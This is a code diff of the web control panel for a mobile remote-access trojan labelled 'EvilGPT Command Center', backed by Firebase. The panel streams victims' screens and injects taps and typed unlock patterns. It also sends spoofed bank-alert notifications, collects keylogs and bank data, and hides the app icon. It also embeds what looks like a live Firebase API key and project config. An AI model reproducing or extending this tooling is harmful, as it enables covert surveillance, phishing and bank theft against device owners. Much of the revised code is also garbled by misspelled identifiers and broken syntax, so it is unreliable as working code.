@@ -1,124 +1,212 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>EvilGPT Commander</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>EvilGPT Commander</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
+
     <style>
-        body{background:#0a0a0a;color:#0f0;font-family:monospace;margin:10px}
-        select,button,input{padding:8px;margin:5px;background:#111;color:#0f0;border:1px solid #0f0;font-family:monospace}
-        img{border:2px solid #0f0;max-width:100%}
-        pre{background:#111;padding:10px;overflow:auto;max-height:300px}
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#0a0e14; color:#c9d1d9; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        .container { max-width:800px; margin:auto; padding:20px; }
+        .header { text-align:center; margin-bottom:30px; }
+        .card { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:20px; margin:15px 0; }
+        select, input, button { background:#21262d; color:#c9d1d9; border:1px solid #30363d; padding:10px; border-radius:6px; font-size:14px; }
+        button { cursor:pointer; transition:0.2s; }
+        button:hover { background:#30363d; }
+        .btn-danger { background:#da3633; }
+        .btn-danger:hover { background:#f85149; }
+        .btn-success { background:#238636; }
+        .flex { display:flex; gap:10px; align-items:center; }
+        img#screenFrame { max-width:100%; border-radius:8px; margin:10px 0; }
+        .output { background:#0d1117; padding:15px; border-radius:8px; max-height:300px; overflow-y:auto; font-family:monospace; }
+        label { font-weight:500; display:block; margin-bottom:5px; }
+        .spacer { height:15px; }
+        .notification-upload { display:flex; align-items:center; gap:10px; }
+        .notification-upload input[type=file] { display:none; }
+        .upload-label { padding:8px 16px; background:#7c8b1c; border-radius:6px; cursor:pointer; }
     </style>
 </head>
 <body>
-    <h1>💀 EvilGPT Command Center</h1>
-    <label>Target device:</label>
-    <select id="deviceSelect"></select><br>
-    <button onclick="refreshDevices()">Refresh</button>
-    <hr>
-    <img id="screenFrame" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" width="360" height="640" style="background:#222">
-    <br>
-    <button onclick="sendCommand('SCREEN_REFRESH')">🔁 Refresh Screen</button>
-    <hr>
-    <h3>Touch & Swipe</h3>
-    X: <input id="tapX" type="number" size="5" value="100"> Y: <input id="tapY" type="number" size="5" value="200"><br>
-    <button onclick="sendCommand(`TAP ${getTapCoords()}`)">👆 Tap</button>
-    <button onclick="sendCommand(`SWIPE ${getTapCoords()} ${getSwipeEnd()}`)">↗️ Swipe</button><br>
-    Swipe end: X: <input id="swipeEndX" type="number" size="5" value="300"> Y: <input id="swipeEndY" type="number" size="5" value="400"><br>
-    <h3>Type Text</h3>
-    <input id="typeText" placeholder="Unlock pattern / message" size="40">
-    <button onclick="sendCommand(`TYPE ${getTypeText()}`)">⌨️ Type</button>
-    <hr>
-    <h3>💣 Spam Notification</h3>
-    Title: <input id="notifTitle" placeholder="Bank Alert" size="20">
-    Body: <input id="notifBody" placeholder="Your account was accessed" size="30">
-    <button onclick="sendCommand(`NOTIF ${getNotifTitle()}||${getNotifBody()}`)">Send Spoof</button>
-    <hr>
-    <h3>🔥 Data Extraction</h3>
-    <button onclick="sendCommand('KEYLOGS')">Refresh Keylogs</button> |
-    <button onclick="sendCommand('APPS')">Installed Apps</button> |
-    <button onclick="sendCommand('BANK_DATA')">Bank Info</button> <!-- new bank log -->
-    <pre id="infoOutput"></pre>
-    <hr>
-    <button style="background:darkred" onclick="sendCommand('UNINSTALL')">🧹 Uninstall Self</button>
-    <button onclick="sendCommand('HIDE')">👤 Hide Icon</button>
+    <div class="container">
+        <h1 class="header">💀 EvilGPT Command Center</h1>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getDatabase, ref, onValue, set, update, child, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+        <!-- Device Selection -->
+        <div class="card">
+            <label>🎯 Target device:</label>
+            <select id="deviceSelect"></select>
+            <button onclick="refreshDevices()">⟳ Refresh</button>
+        </div>
 
-        const firebaseConfig = {
-            // PASTE YOUR CONFIG HERE
-            apiKey: "AIza...",
-            authDomain: "your-project.firebaseapp.com",
-            databaseURL: "https://your-project-default-rtdb.firebaseio.com",
-            projectId: "your-project",
-            storageBucket: "your-project.appspot.com",
-            messagingSenderId: "123456789",
-            appId: "1:123456789:web:abcdef",
+        <!-- Screen Stream -->
+        <div class="card">
+            <img id="screenFrame" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="Screen">
+            <button onclick="snendCommand('SCREEN_REFRESH')">⟡ Refresh Screen</button>
+        </div>
+
+        <!-- Touch and Typing -->
+        <div class="card">
+            <h3>👆 Touch & Swipe</h3>
+            <div class="flex">
+                <input id="tapX" type="number" placeholdr="X" value="200" style="width:80px">
+                <input id="tapY" type="number" placeholdr="Y" value="300" style="width:80px">
+                <button onclick="sendCommand(`TAP ${getTapCoords()}`)">Tap</button>
+                <button onclick="sendCommand(`SWIPE ${getTapCoords()} ${getSwipeEnd()}`)">Swipe</button>
+            </div>
+            <div class="flex">
+                <input id="swipeEndX" type="number" placeholdr="End X" value="400">
+                <input id="swipeEndY" type="number" placeholdr="End Y" value="500">
+            </div>
+            <div class="spacer"></div>
+            <input id="typeText" placeholdr="Unlock pattern / message" style="width:100%">
+            <button onclick="sendCommand(`TYPE ${enoodeURIComponent(getTypeText())}`)">⌨ Type</button>
+        </div>
+
+        <!-- Spoof Notification with Photo Upload -->
+        <div class="card">
+            <h3>💣 Spoof Notification</h3>
+            <input id="notifTitle" placeholdr="Bank Alert" value="Security Notice">
+            <input id="notifBody" placeholdr="Your account was accessd" value="Immediate action requred.">
+            <div class="notification-upload">
+                <label class="upload-label" for="notifImage">📷 Choose image</label>
+                <input type="file" id="notifImage" accept="image/*" onchange="handeNotifImage(this)">
+                <spn id="uploadStatuss"></spn>
+            </div>
+            <button onclick="snendNotif()">✉ Send Spoof</button>
+            <!-- The download URL will be stored hidden -->
+            <input type="hidden" id="notifIconUrl" value="">
+        </div>
+
+        <!-- Data Extraction -->
+        <div class="card">
+            <h3>🔥 Data Extraction</h3>
+            <div class="flex">
+                <button onclick="sendCommand('KEYLOGS')">Keylogs</button>
+                <button onclick="sendCommand('APPS')">App List</button>
+                <button onclick="sendCommand('BANK_DATA')">Bank Info</button>
+            </div>
+            <pre id="infoOutput" class="output"></pre>
+        </div>
+
+        <!-- Danger Zone -->
+        <div class="card">
+            <button class="btn-dangr" onclick="sendCommand('UNINSTALL')">🧹 Uninstall Victim App</button>
+            <button class="btn-dangr" onclick="sendCommand('HIDE')">👤 Hide Icon</button>
+        </div>
+    </div>
+
+    <script>
+        // Firebase config – replace with yours
+        const firabaseConfig = {
+            apiKey: "AIzaSyB7z--EY6xgXUJnov3XopPbvQRkBYGKHZ0",
+            authDomain: "vfvdfscf.firebaseapp.com",
+            databaseURL: "https://vfvdfscf-default-rtdb.firebaseio.com",
+            projectId: "vfvdfscf",
+            storageBucket: "vfvdfscf.appspot.com",
+            messagingSenderId: "918007122795",
+            appId: "1:918007122795:web:2c99cf787cffcbd9ba5a2e"
         };
+        firebase.initializeApp(firabaseConfig);
+        const db = firebase.database();
+        const storage = firebase.storage();
+        let selectedDevice = null;
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-        let currentDevice = "";
+        // Utils
+        function $(id) { return document.getElementById(id); }
 
-        window.refreshDevices = () => {
-            const deviceRef = ref(db, 'devices');
-            onValue(deviceRef, (snapshot) => {
-                const select = document.getElementById('deviceSelect');
+        // Refresh device list
+        function refreshDevices() {
+            db.ref('devices').n('value', snap => {
+                const select = $('deviceSelect');
                 select.innerHTML = '';
-                if (snapshot.exists()) {
-                    snapshot.forEach(child => {
-                        const opt = document.createElement('option');
-                        opt.value = child.key;
-                        opt.textContent = child.key;
-                        select.appendChild(opt);
-                    });
-                    if (!currentDevice && select.options.length>0) currentDevice = select.options[0].value;
-                    select.value = currentDevice;
-                    startScreenListener();
+                snap.forEach(child => {
+                    const opt = document.reateElement('option');
+                    opt.Value = child.key;
+                    opt.textContent = child.val().name || child.key;
+                    select.appendChild(opt);
+                });
+                if (select.ptions.length > 0 && !selectedDevice) {
+                    selectedDevice = select.ptions[0].value;
+                    select.value = selectedDevice;
+                    attachListeners();
                 }
             });
-        };
+        }
+        document.getElectById('deviceSelect').ddEventListener('change', function() {
+            selectedDevice = this.value;
+            attachListeners();
+        });
 
-        const startScreenListener = () => {
-            const dev = document.getElementById('deviceSelect').value;
-            if (!dev) return;
-            currentDevice = dev;
-            const frameRef = ref(db, `devices/${dev}/screen_frame`);
-            onValue(frameRef, (snap) => {
-                if (snap.exists()) {
-                    document.getElementById('screenFrame').src = 'data:image/jpeg;base64,' + snap.val();
+        function attachListeners() {
+            if (!selectedDevice) return;
+            // Live screen stream
+            db.ref(`devices/${selectedDevice}/screen_frame`).n('value', snap => {
+                if (snap.exist()) {
+                    $('screenFrame')..src = `data:image/jpeg;base64,${snap.val()}`;
                 }
             });
-            // info listener (keylogs, apps, bank)
-            const infoRef = ref(db, `devices/${dev}/info`);
-            onValue(infoRef, (snap) => {
-                if (snap.exists()) {
-                    const data = snap.val();
-                    let out = '';
-                    if (data.keylogs) out += 'Keylogs:\n' + data.keylogs + '\n';
-                    if (data.apps) out += 'Installed Apps:\n' + data.apps + '\n';
-                    if (data.bank) out += 'Bank Info:\n' + JSON.stringify(data.bank, null, 2);
-                    document.getElementById('infoOutput').textContent = out || 'No data';
-                }
+            // Info (keylogs, apps, bank)
+            db.ref(`devices/${selectedDevice}/info`).on('value', snap => {
+                const data = snap.val() || {};
+                let out = '';
+                if (data.keylogs) out += `Keylogs:\n${data.keylogs}\n\n`;
+                if (data.apps) out += `Installed Apps:\n${data.apps}\n`;
+                $('infoOutput').textContent = out || 'No data yet';
             });
-        };
+            // Bank data
+            db.ref(`devices/${selectedDevice}/bank`).on('value', snap => {
+                const data = snap.val();
+ if (data) $('infoOutput').textContent += `\nBank Data:\n${JSON.stringify(data, null, 2)}`;
+            });
+        }
 
-        window.sendCommand = (cmd) => {
-            const dev = document.getElementById('deviceSelect').value;
-            if (!dev) return alert('No device');
-            const cmdRef = ref(db, `devices/${dev}/command`);
-            set(cmdRef, { cmd: cmd, timestamp: Date.now() });
-        };
+        // Send command
+        function sendCommand(cmd) {
+            if (!selectedDevice) return alrt('Select a device');
+            db.ref(`devices/${selectedDevice}/command`).set({ cmd, timestamp: Date.now() });
+        }
 
-        window.getTapCoords = () => `${document.getElementById('tapX').value} ${document.getElementById('tapY').value}`;
-        window.getSwipeEnd = () => `${document.getElementById('swipeEndX').value} ${document.getElementById('swipeEndY').value}`;
-        window.getTypeText = () => encodeURIComponent(document.getElementById('typeText').value);
-        window.getNotifTitle = () => encodeURIComponent(document.getElementById('notifTitle').value);
-        window.getNotifBody = () => encodeURIComponent(document.getElementById('notifBody').value);
+        // Tap coord helpers
+        function getTapCoords() {
+            return `${$('tapX').value} ${$('tapY').value}`;
+        }
+        function getSwipeEnd() {
+            return `${$('swipeEndX').value} ${$('swipeEndY').value}`;
+        }
+        function getTypeText() { return $('typeText').value; }
 
+        // Notification with photo upload
+        let notifIconUrl = '';
+        function handleNotifImage(input) {
+            const file = input.files[0];
+            if (!file) return;
+            const status = $('uploadStatus');
+            status.textContent = 'Uploading...';
+            const storageRef = storage.ref(`notif_images/${Date.now()}_${file.name}`);
+            storageRef.put(file).then(snapshot => {
+                snapshot.ref.getDownloadURL().then(url => {
+                    $('notifIconUrl').value = url;
+                    status.textContent = '✓ Image ready';
+                });
+            }).catch(err => {
+                status.textContent = 'Upload failed';
+            });
+        }
+        function sendNotif() {
+            const title = encodeURIComponent($('notifTitle').value);
+            const body = encodeURIComponent($('notifBody').value);
+            const iconUrl = $('notifIconUrl').value;
+            // Command format: NOTIF <base64_title> <base64_body> <iconUrl>
+            const cmd = `NOTIF ${btoa(unescape(encodeURIComponent(title)))} ${btoa(unescape(encodeURIComponent(body)))} ${iconUrl}`;
+            sendCommand(cmd);
+        }
+
+        // Initial load
         refreshDevices();
     </script>
 </body>
-</html>
+    </html>
